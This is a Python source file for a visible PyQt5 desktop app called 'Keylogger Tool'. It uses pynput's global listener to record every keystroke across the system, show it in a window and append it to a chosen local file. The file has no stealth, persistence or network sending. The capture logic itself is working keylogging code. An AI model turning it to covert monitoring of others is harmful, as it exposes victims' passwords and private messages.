# IMPORTS
import sys
from PyQt5.QtWidgets import (
    QApplication, QMainWindow, QTextEdit, QPushButton, QLabel, QVBoxLayout, QHBoxLayout,
    QWidget, QFileDialog, QLineEdit, QMessageBox
)
from PyQt5.QtGui import QFont
from pynput import keyboard

# CLASS DEFINITION AND INITIALIZATION
# KEYLOGGER APP CLASS
class KeyLoggerApp(QMainWindow):
    # INITIALIZATION
    def __init__(self):
        # Initialize the KeyLogger application.
        super().__init__()
        self.initUI()

    # UI INITIALIZATION
    # USER INTERFACE SETUP
    def initUI(self):
        
        # Set up the user interface components.
        self.setWindowTitle('Keylogger Tool')
        self.setGeometry(100, 100, 500, 400)

        # Set up the user interface components.
        self.filename = ""
        self.is_logging = False
        self.logged_keys = ""
        self.listener = None

        central_widget = QWidget()
        self.setCentralWidget(central_widget)

        layout = QVBoxLayout()

        self.create_textbox(layout)
        self.create_status_label(layout)
        self.create_file_controls(layout)
        self.create_buttons(layout)

        central_widget.setLayout(layout)

    # TEXTBOX CREATION
    def create_textbox(self, layout):
    
        # Create a textbox to display logged keys.
        self.textbox = QTextEdit()
        self.textbox.setPlaceholderText("Logged keys will appear here...")
        self.textbox.setReadOnly(True)
        layout.addWidget(self.textbox)

    # STATUS LABEL CREATION
    def create_status_label(self, layout):
        
        # Create a label to show the status of logging.
        self.status_label = QLabel("Logging Stopped")
        font = QFont()
        font.setPointSize(12)  # Font size
        font.setBold(True)     # Set font to bold
        self.status_label.setFont(font)
        self.status_label.setStyleSheet("color: red;")  # Default color for stopped
        layout.addWidget(self.status_label)

    # FILE CONTROLS CREATION
    def create_file_controls(self, layout):
        
        # Create controls for choosing the file path.
        file_layout = QHBoxLayout()

        # Choose File Button
        self.choose_file_button = QPushButton("Choose File")
        self.choose_file_button.setStyleSheet("background-color: #3498db; color: white; font-weight: bold;")
        self.choose_file_button.clicked.connect(self.choose_file)
        file_layout.addWidget(self.choose_file_button)

        # Choose File Path
        self.file_path_input = QLineEdit()
        self.file_path_input.setPlaceholderText("File path for logging...")
        self.file_path_input.setReadOnly(True)
        file_layout.addWidget(self.file_path_input)

        layout.addLayout(file_layout)

    # BUTTONS CREATION
    def create_buttons(self, layout):
        
        # Create buttons for controlling logging and log management.
        button_layout = QHBoxLayout()
        button_style = "background-color: #3498db; color: white; font-weight: bold;"

        # Save Log button
        self.save_log_button = QPushButton("Save Log")
        self.save_log_button.setStyleSheet(button_style)
        self.save_log_button.clicked.connect(self.save_log)
        button_layout.addWidget(self.save_log_button)

        # Start Log button
        self.start_button = QPushButton("Start Logging")
        self.start_button.setStyleSheet(button_style)
        self.start_button.clicked.connect(self.start_logging)
        button_layout.addWidget(self.start_button)

        # Stop Log button
        self.stop_button = QPushButton("Stop Logging")
        self.stop_button.setStyleSheet(button_style)
        self.stop_button.clicked.connect(self.stop_logging)
        self.stop_button.setEnabled(False)
        button_layout.addWidget(self.stop_button)

        # Clear Log button
        self.clear_button = QPushButton("Clear Logs")
        self.clear_button.setStyleSheet(button_style)
        self.clear_button.clicked.connect(self.clear_logs)
        button_layout.addWidget(self.clear_button)

        layout.addLayout(button_layout)

    # KEY HANDLING
    def get_char(self, key):
        
        # Convert key to string.
        try:
            return key.char
        except AttributeError:
            return str(key)

    # KEY PRESS HANDLING
    def on_press(self, key):
        
        # Handle key press events.
        char = self.get_char(key)
        self.logged_keys += char
        self.textbox.insertPlainText(char)
        self.textbox.ensureCursorVisible()  # Automatically scroll down
        if self.filename and self.is_logging:
            try:
                with open(self.filename, 'a') as logs:
                    logs.write(char)
            except IOError as e:
                QMessageBox.critical(self, "File Error", f"Error writing to file: {e}")

    # LOGGING CONTROLS
    # START LOGGING
    def start_logging(self):
        
        # Start logging keystrokes to the chosen file.
        if not self.is_logging:
            if not self.filename:
                options = QFileDialog.Options()
                self.filename, _ = QFileDialog.getSaveFileName(self, "Save File", "", "Text Files (*.txt);;All Files (*)", options=options)
                if not self.filename:
                    QMessageBox.warning(self, "File Error", "Please select a valid file.")
                    return
                self.file_path_input.setText(self.filename)

            self.is_logging = True
            self.start_button.setEnabled(False)
            self.stop_button.setEnabled(True)
            self.status_label.setText("Logging Started")
            self.status_label.setStyleSheet("color: green;")  # Change color to green
            self.listener = keyboard.Listener(on_press=self.on_press)
            self.listener.start()
        else:
            QMessageBox.information(self, "Already Logging", "Logging is already started.")

    # STOP LOGGING
    def stop_logging(self):
        
        # Stop logging keystrokes.
        if self.is_logging:
            reply = QMessageBox.question(
                self, 'Stop Logging',
                "Are you sure you want to stop logging? The current session will be terminated.",
                QMessageBox.Yes | QMessageBox.No, QMessageBox.No
            )
            if reply == QMessageBox.Yes:
                self.is_logging = False
                self.start_button.setEnabled(True)
                self.stop_button.setEnabled(False)
                self.status_label.setText("Logging Stopped")
                self.status_label.setStyleSheet("color: red;")  # Change color back to red
                if self.listener:
                    self.listener.stop()
                    self.listener.join()  # Wait for the listener to stop properly
            else:
                QMessageBox.information(self, "Logging Active", "Logging will continue.")
        else:
            QMessageBox.information(self, "Not Logging", "Logging is not currently active.")

    # LOG MANAGEMENT
    # CLEAR LOGS
    def clear_logs(self):
        
        # Clear the logged keys displayed in the textbox.
        if self.logged_keys:
            reply = QMessageBox.question(
                self, 'Clear Logs',
                "Are you sure you want to clear the logs? This action cannot be undone.",
                QMessageBox.Yes | QMessageBox.No, QMessageBox.No
            )
            if reply == QMessageBox.Yes:
                self.logged_keys = ""
                self.textbox.clear()
        else:
            QMessageBox.information(self, "No Logs", "There are no logs to clear.")

    # CHOOSE FILE
    def choose_file(self):
        
        # Allow the user to choose a file for logging.
        if self.is_logging:
            QMessageBox.warning(self, "Operation Not Allowed", "You cannot change the file while logging.")
        else:
            options = QFileDialog.Options()
            new_filename, _ = QFileDialog.getSaveFileName(self, "Save File", "", "Text Files (*.txt);;All Files (*)", options=options)
            if new_filename:
                self.filename = new_filename
                self.file_path_input.setText(self.filename)
            else:
                QMessageBox.warning(self, "File Error", "Please select a valid file.")

    # SAVE LOGS
    def save_log(self):
        
        # Save the logged keys to a file.
        if self.logged_keys:
            options = QFileDialog.Options()
            save_filename, _ = QFileDialog.getSaveFileName(self, "Save Log File", "", "Text Files (*.txt);;All Files (*)", options=options)
            if save_filename:
                try:
                    with open(save_filename, 'w') as log_file:
                        log_file.write(self.logged_keys)
                    QMessageBox.information(self, "Save Log", "Log saved successfully.")
                except IOError as e:
                    QMessageBox.critical(self, "File Error", f"Error saving log file: {e}")
            else:
                QMessageBox.warning(self, "File Error", "Please select a valid file to save the log.")
        else:
            QMessageBox.warning(self, "No Log", "There are no logs to save.")

    # APPLICATION EXIT 
    # CLOSE EVENT HANDLING
    def closeEvent(self, event):
    
        # Prompt the user to confirm quitting the application.
        if self.is_logging:
            self.stop_logging()  # Ensure logging stops before quitting
        reply = QMessageBox.question(self, 'Quit', "Do you want to quit?", QMessageBox.Yes | QMessageBox.No, QMessageBox.No)
        if reply == QMessageBox.Yes:
            event.accept()
        else:
            event.ignore()

# MAIN EXECUTION
# MAIN BLOCK
if __name__ == '__main__':
    app = QApplication(sys.argv)
    window = KeyLoggerApp()
    window.show()
    sys.exit(app.exec_())
